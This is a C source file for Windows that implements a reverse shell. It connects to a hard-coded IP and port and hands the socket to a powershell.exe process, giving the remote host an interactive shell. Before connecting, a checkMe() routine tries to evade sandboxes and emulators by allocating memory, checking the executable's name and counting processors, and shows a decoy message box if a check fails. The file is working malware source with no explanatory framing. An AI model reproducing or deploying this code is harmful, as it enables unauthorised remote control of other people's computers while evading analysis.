#include <winsock2.h>
#include <stdio.h>
#include <winuser.h>
#pragma comment(lib,"ws2_32")
#pragma comment(lib, "user32.lib")

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax; 
char ip_addr[16] = "192.168.0.15"; 
char port[6] = "9001";            

STARTUPINFO ini_processo;

PROCESS_INFORMATION processo_info;

//function calls
int checkMe(){
	//check if being emulated

	SYSTEM_INFO s;

	MEMORYSTATUSEX ms;	
	DWORD procNum;

	DWORD ram;

	unsigned char lpFileName[201];

	GetModuleFileName(NULL,(char *)lpFileName,sizeof(lpFileName));
		
	int result;
	char * last;
		
	char * token = strtok(lpFileName,"\\");

	char * mem = NULL;
	mem = (char *) malloc (6900000);

	
	if(mem == NULL){
		MessageBox(NULL,last,"HELLO!", MB_OKCANCEL);
		return -1;
	}

	memset(mem,69,6900000);
	
	while(token != NULL){
		last = token;
		token = strtok(NULL,"\\");
	}
	result = strcmp(strlwr(last),"myapp.exe");

	
	if(result == NULL){
		MessageBox(NULL,last,"HELLO!", MB_OKCANCEL);
		return -1;
	}
	
	GetSystemInfo(&s);
	procNum = s.dwNumberOfProcessors;

	if(procNum < 4){
		MessageBox(NULL,last,"HELLO!", MB_OKCANCEL);
		return -1;
	}

	free(mem);
		
	return 0;
}


int main()
{
	
	if (checkMe() == 0){
		// classic shell	
		WSAStartup(MAKEWORD(2, 2), &wsaData);
		Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);


		struct hostent *host; 
		host = gethostbyname(ip_addr);

		strcpy(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));

		hax.sin_family = AF_INET;
		hax.sin_port = htons(atoi(port));

		hax.sin_addr.s_addr = inet_addr(ip_addr);

		WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

		memset(&ini_processo, 0, sizeof(ini_processo));
		ini_processo.cb = sizeof(ini_processo);
		ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

		ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

		TCHAR cmd[255] = TEXT("powershell.exe");


		CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
	}
    return 0;
}